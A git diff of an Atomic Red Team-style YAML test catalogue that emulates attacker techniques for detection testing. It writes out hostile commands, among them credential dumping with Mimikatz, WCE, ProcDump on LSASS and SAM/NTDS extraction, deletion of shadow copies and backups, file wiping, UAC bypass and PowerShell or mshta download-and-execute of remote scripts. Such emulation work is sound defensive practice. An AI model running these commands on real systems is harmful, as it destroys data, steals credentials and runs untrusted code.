+          New-Item -ItemType Directory (Split-Path "#{sdelete_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\Sdelete\sdelete.exe "#{sdelete_exe}" -Force
       executor:
-        name: command_prompt
-        command: 'sdelete.exe #{file_to_overwrite}
-
-'
+        name: powershell
+        command: |
+          New-Item $env:TEMP\T1485.txt
+          #{sdelete_exe} -accepteula $env:TEMP\T1485.txt
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
-
         To stop the test, break the command with CTRL/CMD+C.
       supported_platforms:
-      - centos
       - linux
       - macos
-      - ubuntu
       input_arguments:
         overwrite_source:
           description: Path of data source to overwrite with
@@ -15449,8 +15940,11 @@ impact:
       - windows
       executor:
         name: command_prompt
-        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+        elevation_required: true
+        command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
           c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+
+'
   '':
     technique:
       x_mitre_data_sources:
@@ -15621,6 +16115,19 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+      description: "Deletes Windows Volume Shadow Copies with PowerShell code and
+        Get-WMIObject. \nThis technique is used by numerous ransomware families such
+        as Sodinokibi/REvil.\nExecutes Get-WMIObject \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object
+          {$_.Delete();}"
+
+'
   T1496:
     technique:
       x_mitre_data_sources:
@@ -15691,8 +16198,6 @@ impact:
         End the test by using CTRL/CMD+C to break.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: bash
@@ -15919,8 +16424,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       input_arguments:
         timeout:
           description: Time to restart (can be minutes or specific time)
@@ -15939,8 +16442,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       input_arguments:
         timeout:
           description: Time to shutdown (can be minutes or specific time)
@@ -15959,8 +16460,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -15973,8 +16472,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -15985,8 +16482,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -15997,8 +16492,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16009,8 +16502,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16411,6 +16902,30 @@ discovery:
         name: sh
         command: 'find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/chrome-bookmarks.txt
           \;
+
+'
+    - name: List Google Chrome Bookmarks on Windows with powershell
+      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
+        that contains bookmarks.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: 'where.exe /R C:\Users\ Bookmarks
+
+'
+    - name: List Google Chrome Bookmarks on Windows with command prompt
+      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
+        that contains bookmarks.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: 'where /R C:\Users\ Bookmarks
 
 '
   '':
@@ -16965,7 +17480,7 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: command_prompt
         elevation_required: false
@@ -16982,14 +17497,14 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: powershell
         elevation_required: false
         command: |
           net view \\#{computer_name}
           get-smbshare -Name #{computer_name}
-    - name: View avaliabe share drives
+    - name: View available share drives
       description: View information about all of the resources that are shared on
         the local computer
       supported_platforms:
@@ -17189,7 +17704,7 @@ discovery:
 
 '
       supported_platforms:
-      - ubuntu
+      - linux
       executor:
         name: bash
         command: 'cat /etc/pam.d/common-password
@@ -17201,7 +17716,12 @@ discovery:
 
 '
       supported_platforms:
-      - centos
+      - linux
+      dependencies:
+      - description: System must be CentOS or RHEL v7
+        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "7" ]; then
+          exit /b 0; else exit /b 1; fi;
+        get_prereq_command: echo Please run from CentOS or RHEL v7
       executor:
         name: bash
         command: 'cat /etc/security/pwquality.conf
@@ -17213,12 +17733,16 @@ discovery:
 
 '
       supported_platforms:
-      - centos
+      - linux
+      dependencies:
+      - description: System must be CentOS or RHEL v6
+        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then
+          exit /b 0; else exit /b 1; fi;
+        get_prereq_command: echo Please run from CentOS or RHEL v6
       executor:
         name: bash
         command: |
           cat /etc/pam.d/system-auth
-
           cat /etc/security/pwquality.conf
     - name: Examine password expiration policy - All Linux
       description: 'Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.
@@ -17450,8 +17974,6 @@ discovery:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         output_file:
@@ -17851,7 +18373,20 @@ discovery:
       executor:
         name: command_prompt
         elevation_required: true
-        command: fltmc.exe | findstr.exe 385201
+        command: 'fltmc.exe | findstr.exe 385201
+
+'
+    - name: Security Software Discovery - AV Discovery via WMI
+      description: 'Discovery of installed antivirus products via a WMI query.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
+          Get displayName /Format:List
   T1518:
     technique:
       x_mitre_data_sources:
@@ -17916,11 +18451,11 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          POWERSHELL.EXE "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
-          powershell.exe "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
+          Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
+          Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
   T1082:
     technique:
       x_mitre_permissions_required:
@@ -18450,11 +18985,6 @@ discovery:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        service_name:
-          description: Name of service to start stop, query
-          type: string
-          default: svchost.exe
       executor:
         name: command_prompt
         elevation_required: true
@@ -18462,9 +18992,6 @@ discovery:
           tasklist.exe
           sc query
           sc query state= all
-          sc start #{service_name}
-          sc stop #{service_name}
-          wmic service where (displayname like "#{service_name}") get name
     - name: System Service Discovery - net.exe
       description: 'Enumerates started system services using net.exe and writes them
         to a file. This technique has been used by multiple threat actors.
@@ -19216,8 +19743,8 @@ credential-access:
       identifier: T1003
     atomic_tests:
     - name: Powershell Mimikatz
-      description: 'Dumps Credentials via Powershell by invoking a remote mimikatz
-        script
+      description: 'Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script
 
 '
       supported_platforms:
@@ -19226,7 +19753,7 @@ credential-access:
         remote_script:
           description: URL to a remote Mimikatz script that dumps credentials
           type: Url
-          default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
       executor:
         name: powershell
         elevation_required: true
@@ -19235,19 +19762,29 @@ credential-access:
 
 '
     - name: Gsecdump
-      description: 'https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+      description: 'Dump credentials from memory using Gsecdump
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        gsecdump_exe:
+          description: Path to the Gsecdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Windows Credential Editor must exist on disk at specified location
+          (#{gsecdump_exe})
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {0} else {1}'
+        get_prereq_command: Write-Host Automated installer not implemented yet
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'gsecdump -a
-
-'
+        command: "#{gsecdump_exe} -a\n"
     - name: Windows Credential Editor
-      description: 'http://www.ampliasecurity.com/research/windows-credentials-editor/
+      description: 'Dump credentials from memory using Windows Credential Editor from
+        https://www.ampliasecurity.com/research/windows-credentials-editor/
 
 '
       supported_platforms:
@@ -19256,13 +19793,35 @@ credential-access:
         output_file:
           description: Path where resulting data should be placed
           type: Path
-          default: output.txt
+          default: "%temp%\\output.txt"
+        wce_exe:
+          description: Path of Windows Credential Editor executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\wce.exe
+        wce_url:
+          description: Path to download Windows Credential Editor zip file
+          type: url
+          default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+        wce_zip_hash:
+          description: File hash of the Windows Credential Editor zip file
+          type: String
+          default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Windows Credential Editor must exist on disk at specified location
+          (#{wce_exe})
+        prereq_command: 'if (Test-Path #{wce_exe}) {0} else {1}'
+        get_prereq_command: |-
+          $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+          if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
+            Expand-Archive $zippath $parentpath\wce -Force
+            Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+            Remove-Item $zippath, $parentpath\wce -Recurse
+          }
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'wce -o #{output_file}
-
-'
+        command: "#{wce_exe} -o #{output_file}\n"
     - name: Registry dump of SAM, creds, and secrets
       description: |
         Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
@@ -19273,13 +19832,13 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam sam
-          reg save HKLM\system system
-          reg save HKLM\security security
+          reg save HKLM\sam %temp%\sam
+          reg save HKLM\system %temp%\system
+          reg save HKLM\security %temp%\security
         cleanup_command: |
-          rm sam
-          rm system
-          rm security
+          del %temp%\sam >nul 2> nul
+          del %temp%\system >nul 2> nul
+          del %temp%\security >nul 2> nul
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -19290,11 +19849,26 @@ credential-access:
         output_file:
           description: Path where resulting dump should be placed
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
+        procdump_exe:
+          description: Path of Procdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\procdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ProcDump tool from Sysinternals must exist on disk at specified
+          location (#{procdump_exe})
+        prereq_command: 'if (Test-Path #{procdump_exe}) {0} else {1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
       executor:
         elevation_required: true
         name: command_prompt
-        command: 'procdump.exe -accepteula -ma lsass.exe #{output_file}
+        command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
+        cleanup_command: 'del "#{output_file}" >nul 2> nul
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
@@ -19323,21 +19897,21 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        mimikatz_binary_path:
+          description: Path of the Mimikatz binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"
         input_file:
-          description: Path where resulting dump should be placed
+          description: Path of the Lsass dump
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
       executor:
-        name: manual
-        steps: |
-          1. Open Mimikatz:
-            Execute `mimikatz` at a command prompt.
+        name: command_prompt
+        elevation_required: true
+        command: '#{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
+          full" exit
 
-          2. Select a Memory Dump:
-            Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
-
-          3. Obtain Credentials:
-            Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
+'
     - name: Dump Active Directory Database with NTDSUtil
       description: |
         The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
@@ -19349,7 +19923,13 @@ credential-access:
         output_folder:
           description: Path where resulting dump should be placed
           type: Path
-          default: C:\Atomic_Red_Team
+          default: C:\Windows\Temp
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19368,6 +19948,12 @@ credential-access:
           description: Drive letter to source VSC (including colon)
           type: String
           default: 'C:'
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19390,7 +19976,20 @@ credential-access:
         extract_path:
           description: Path for extracted NTDS.dit
           type: Path
-          default: C:\Extract
+          default: C:\Windows\Temp
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
+      - description: Volume shadow copy must exist
+        prereq_command: 'if not exist #{vsc_name} (exit /b 1)'
+        get_prereq_command: echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume
+          Shadow Copy with NTDS.dit'" to fulfuill this requirement
+      - description: Extract path must exist
+        prereq_command: 'if not exist #{extract_path} (exit /b 1)'
+        get_prereq_command: 'mkdir #{extract_path}'
       executor:
         name: command_prompt
         elevation_required: true
@@ -19398,6 +19997,10 @@ credential-access:
           copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
           copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
           reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+        cleanup_command: |
+          del "#{extract_path}\ntds.dit"        >nul 2> nul
+          del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
+          del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
     - name: GPP Passwords (findstr)
       description: 'Look for the encrypted cpassword value within Group Policy Preference
         files on the Domain Controller. This value can be decrypted with gpp-decrypt
@@ -19406,6 +20009,13 @@ credential-access:
 '
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: command_prompt
         elevation_required: false
@@ -19423,13 +20033,97 @@ credential-access:
         gpp_script_path:
           description: Path to the Get-GPPPassword PowerShell Script
           type: Path
-          default: "$PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1"
+          default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+        gpp_script_url:
+          description: URL of the Get-GPPPassword PowerShell Script
+          type: url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
+        prereq_command: if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
+        get_prereq_command: |-
+          New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
+          Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: powershell
         elevation_required: false
         command: |
           . #{gpp_script_path}
           Get-GPPPassword -Verbose
+    - name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
+      description: |
+        This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        ninjacopy_script_path:
+          description: Path to the Invoke-NinjaCopy PowerShell script
+          type: Path
+          default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+        ninjacopy_script_url:
+          description: URL of the Invoke-NinjaCopy PowerShell Script
+          type: url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}'
+        prereq_command: if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
+        get_prereq_command: |-
+          New-Item -ItemType Directory (Split-Path "#{ninjacopy_script_path}") -Force | Out-Null
+          Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          . #{ninjacopy_script_path}
+          Invoke-NinjaCopy -Path "%systemroot%\System32\sam" -LocalDestination "#{output_folder}\sam"
+          Invoke-NinjaCopy -Path "%systemroot%\System32\system" -LocalDestination "#{output_folder}\system"
+          Invoke-NinjaCopy -Path "%systemroot%\System32\security" -LocalDestination "#{output_folder}\security"
+        cleanup_command: |
+          del "#{output_folder}\sam" >nul 2> nul
+          del "#{output_folder}\system" >nul 2> nul
+          del "#{output_folder}\security" >nul 2> nul
+    - name: LSASS read with pypykatz
+      description: |
+        Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
+        #https://github.com/skelsec/pypykatz and it's dependencies must be installed
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        prereq_command: 'py -3
+
+'
+        command: 'pypykatz live lsa
+
+'
+    - name: Registry parse with pypykatz
+      description: |
+        Parses registry hives to obtain stored credentials
+        #https://github.com/skelsec/pypykatz and it's dependencies must be installed
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        prereq_command: 'py -3
+
+'
+        command: 'pypykatz live registry
+
+'
   T1081:
     technique:
       x_mitre_permissions_required:
@@ -19747,7 +20441,7 @@ credential-access:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -20337,7 +21031,6 @@ credential-access:
     - name: Private Keys
       description: |
         Find private keys on the Windows file system.
-
         File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
       supported_platforms:
       - windows
@@ -20347,6 +21040,9 @@ credential-access:
         command: |
           echo "ATOMICREDTEAM" > %windir%\cert.key
           dir c:\ /b /s .key | findstr /e .key
+        cleanup_command: 'del c:\Windows\cert.key
+
+'
     - name: Discover Private SSH Keys
       description: 'Discover private SSH keys on a macOS or Linux system.
 
@@ -20557,7 +21253,7 @@ execution:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -20575,7 +21271,7 @@ execution:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -20633,8 +21329,6 @@ execution:
         This will download the specified payload and set a marker file in `/tmp/art-fish.txt`.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
@@ -20889,11 +21583,11 @@ execution:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1173:
@@ -21260,8 +21954,6 @@ execution:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -21285,8 +21977,6 @@ execution:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -21307,8 +21997,6 @@ execution:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
@@ -21448,7 +22136,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -21476,15 +22164,10 @@ execution:
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
       supported_platforms:
       - windows
-      input_arguments:
-        atomics_path:
-          description: path to atomics folder
-          type: path
-          default: "..\\..\\atomics"
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
@@ -21497,10 +22180,12 @@ execution:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
       executor:
         name: command_prompt
-        command: 'mshta #{hta_url}'
+        command: 'mshta #{hta_url}
+
+'
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -21601,7 +22286,7 @@ execution:
         mimurl:
           description: Mimikatz url
           type: url
-          default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
       executor:
         name: command_prompt
         elevation_required: true
@@ -21619,7 +22304,7 @@ execution:
         bloodurl:
           description: BloodHound URL
           type: url
-          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
+          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -21649,7 +22334,7 @@ execution:
       executor:
         name: powershell
         elevation_required: true
-        command: "$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object
+        command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object
           -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty
           $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP
           $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item
@@ -21671,7 +22356,7 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'');
+        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'');
           Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
 
 '
@@ -21815,12 +22500,15 @@ execution:
 '
       supported_platforms:
       - windows
+      dependencies:
+      - description: PowerShell version 2 must be installed
+        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else
+          {1}
+        get_prereq_command: Write-Host  Automated installer not implemented yet, please
+          install PowerShell v2 manually
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major){0}else{1}
-
-'
         command: 'powershell.exe -version 2 -Command Write-Host $PSVersion
 
 '
@@ -21836,13 +22524,14 @@ execution:
           description: File created to store Alternate Stream Data
           type: String
           default: "$env:TEMP\\NTFS_ADS.txt"
+      dependencies:
+      - description: Homedrive must be an NTFS drive
+        prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+          -contains "NTFS") {0} else {1}
+        get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
-          -contains "NTFS"){0}else{1}
-
-'
         command: |
           Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
           $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
@@ -21931,7 +22620,9 @@ execution:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -21957,6 +22648,7 @@ execution:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -22611,7 +23303,7 @@ execution:
       supported_platforms:
       - windows
       input_arguments:
-        psexec_path:
+        psexec_exe:
           description: Path to PsExec
           type: string
           default: C:\PSTools\PsExec.exe
@@ -22619,13 +23311,19 @@ execution:
           description: Remote hostname or IP address
           type: string
           default: localhost
+      dependencies:
+      - description: PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_exe})
+        prereq_command: if (Test-Path "#{psexec_exe}"") {0} else {1}
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
-
-'
-        command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
 
 '
   T1218:
@@ -22940,7 +23638,7 @@ execution:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
